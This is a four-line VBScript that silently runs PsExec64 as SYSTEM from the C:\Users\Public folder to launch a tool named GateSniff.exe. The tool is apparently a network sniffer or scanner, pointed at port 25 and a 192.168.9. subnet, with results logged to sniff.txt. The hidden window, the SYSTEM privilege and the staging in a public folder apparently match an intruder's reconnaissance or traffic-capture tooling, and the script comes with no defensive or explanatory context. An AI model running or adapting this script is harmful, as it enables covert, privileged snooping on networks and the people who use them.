Dim sh
Set sh = CreateObject("WScript.Shell")
sh.Run "C:\Users\Public\PsExec64.exe -accepteula -nobanner -i 1 -s C:\Users\Public\GateSniff.exe 25 192.168.9. C:\Users\Public\sniff.txt", 0, True
WScript.Sleep 26000
